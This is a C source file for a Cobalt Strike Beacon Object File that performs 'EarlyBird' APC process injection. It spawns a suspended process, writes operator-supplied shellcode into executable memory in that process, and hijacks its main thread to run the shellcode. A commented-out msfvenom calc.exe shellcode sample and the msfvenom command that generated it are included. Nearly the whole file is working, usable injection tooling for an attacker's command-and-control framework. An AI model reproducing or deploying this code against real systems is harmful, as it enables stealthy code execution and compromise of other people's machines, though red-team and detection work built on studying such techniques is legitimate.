#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI void * __cdecl MSVCRT$memset(void *_Dst,int _Val,size_t _Size);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA (LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, WINBOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE hThread);

#define intZeroMemory(addr,size) MSVCRT$memset((addr),0,size)

/*
// msfvenom -p windows/x64/exec CMD=calc.exe -f c EXITFUNC=thread
//   Payload size: 276 bytes
unsigned char shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";
*/

void go(char * args, int len) {
    datap parser;
	char * peName;
    // Example of creating a raw shellcode payload with msfvenom
    //   msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o popCalc.bin
	unsigned char * shellcode;
    SIZE_T shellcode_len; 

    BeaconDataParse(&parser, args, len);
	peName = BeaconDataExtract(&parser, NULL);
    shellcode_len = BeaconDataLength(&parser);
    shellcode = BeaconDataExtract(&parser, NULL);
    // Declare variables / structs
    HANDLE hProc = NULL;
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    STARTUPINFO sInfo;
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    PROCESS_INFORMATION pInfo;
    // Declare booleans as WINBOOL in BOFs. "bool" will not work
    WINBOOL check1 = 0;
    WINBOOL check2 = 0;
    WINBOOL check3 = 0;
    WINBOOL check4 = 0;
    WINBOOL check5 = 0;
    // Pointer to the RE memory in the remote process we spawn. Returned from when we call WriteProcessMemory with a handle to the remote process
	void * remotePayloadAddr;
    //ULONG_PTR dwData = NULL;
    SIZE_T bytesWritten;
	
    // Zero out memory for STARTUPINFO & PROCESS_INFORMATION 
    // - If you do not zero these out, it can cause errors/crashes
    // https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memset-wmemset?view=msvc-160
    // - This is just a wrapper to memset
    intZeroMemory( &sInfo, sizeof(sInfo) );
    sInfo.cb = sizeof(sInfo);
    intZeroMemory( &pInfo, sizeof(pInfo) );

    // Create a host process in a suspended state
    // After success CreateProcessA will return an open handle to the remote process at PROCESS_INFORMATION.hProcess 
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    check1 = KERNEL32$CreateProcessA(0, peName, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &sInfo, &pInfo);
    if (check1 == 1){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Success - Spawned process for %s at %d (PID)", peName, pInfo.dwProcessId);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Failure - Could not create a process for %s using CreateProcessA()",peName);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting HOLLOW BOF..");
        return;
    }

    // Allocate memory in the spawned process
    // We can write to PAGE_EXECUTE_READ memory in the remote process with WriteProcessMemory, so no need to allocate RW/RWE memory
    remotePayloadAddr = KERNEL32$VirtualAllocEx(pInfo.hProcess, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (remotePayloadAddr != NULL){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Success - Allocated RE memory in remote process %d (PID) at: 0x%p", pInfo.dwProcessId, remotePayloadAddr);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Failure - Could not allocate memory to remote process %d (PID)", pInfo.dwProcessId);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting HOLLOW BOF..");
        return;
    }
    // Write our popCalc shellcode payload to the remote process we spawned at the memory we allocated 
    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    check3 = KERNEL32$WriteProcessMemory(pInfo.hProcess, remotePayloadAddr, (LPCVOID)shellcode, (SIZE_T)shellcode_len, (SIZE_T *) &bytesWritten);
    if (check3 == 1){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Success - Wrote %d bytes to memory in remote process %d (PID) at 0x%p", bytesWritten, pInfo.dwProcessId, remotePayloadAddr);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Failure - Could not write payload to memory at 0x%p", remotePayloadAddr);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting HOLLOW BOF..");
        return;
    }

    // This is the "EarlyBird" technique to hijack control of the processes main thread using APC
    // technique taught in Sektor7 course: RED TEAM Operator: Malware Development Intermediate Course
    // https://institute.sektor7.net/courses/rto-maldev-intermediate/463257-code-injection/1435343-earlybird
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc
    // DWORD QueueUserAPC(
    //   PAPCFUNC  pfnAPC,   - A pointer to the payload we want to run
    //   HANDLE    hThread,  - A handle to the thread. Returned at PROCESS_INFORMATION.hThread after CreateProcessA call
    //   ULONG_PTR dwData    - Argument supplied to pfnAPC? Can be NULL
    // );
    check4 = KERNEL32$QueueUserAPC((PAPCFUNC)remotePayloadAddr, pInfo.hThread, (ULONG_PTR) NULL);
    if (check4 == 1){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Success - APC queued for main thread of %d (PID) to shellcode address 0x%p",  pInfo.dwProcessId, remotePayloadAddr);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Failure - Could not queue APC for main thread of %d (PID) to shellcode address 0x%p",  pInfo.dwProcessId, remotePayloadAddr);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting HOLLOW BOF..");
        return;
    }

    // When we resume the main thread from suspended, APC will trigger and our thread will execute our shellcode
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
    check5 = KERNEL32$ResumeThread(pInfo.hThread);
    if (check5 != -1){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Success - Your thread was resumed and your shellcode is being executed within the remote process!");
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Failure - Could not resume thread.");
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting HOLLOW BOF..");
        return;
    }
}